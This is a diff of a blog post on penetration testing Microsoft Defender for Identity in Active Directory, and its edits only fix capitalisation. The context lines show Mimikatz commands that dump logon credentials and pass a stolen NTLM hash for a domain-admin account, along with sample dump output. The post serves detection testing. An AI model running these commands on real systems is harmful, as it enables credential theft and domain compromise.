@@ -176,7 +176,7 @@ We can run the tool with an elevated command prompt:
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> C:\temp\victims.txt
 {{< /card >}}
 
-Now the tool generates a text file with all logged on users and their hashes. I couldnt test it myself, but i have an example file:
+Now the tool generates a text file with all logged on users and their hashes. I couldnt test it myself, but I have an example file:
 
 {{< card code=true header="**POWERSHELL**" lang="powershell" >}}
 Authentication Id : 0 ; 302247 (00000000:00049ca7)
@@ -206,7 +206,7 @@ SID               : S-1-5-21-1888482495-713651900-1335578256-1655
         credman :
 {{< /card >}}
 
-If i were on a vulnerable workstation, i could run the following command where i stole the hash of user Alexander Harris (remember, this was a domain admin) and issue it against the server:
+If I were on a vulnerable workstation, I could run the following command where I stole the hash of user Alexander Harris (remember, this was a domain admin) and issue it against the server:
 
 {{< card code=true header="**POWERSHELL**" lang="powershell" >}}
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:alexander.harris /ntlm:F5262921B03008499F3F197E9866FA81 /domain:internal.justinverstijnen.nl" "exit"
@@ -252,7 +252,7 @@ It asks for credentials, we can try to log in with some basic, wrong passwords o
 
 This will generate alerts on that account because the account is not really supposed to logon. The SOC will immediately know that an malicious actor is running some malicious behaviour.
 
-After filling in around 15 wrong passwords i filled in the right password on purpose:
+After filling in around 15 wrong passwords I filled in the right password on purpose:
 
 [![jv-media-1049-84adbdc276e6.png](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-84adbdc276e6.png)](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-84adbdc276e6.png)
 
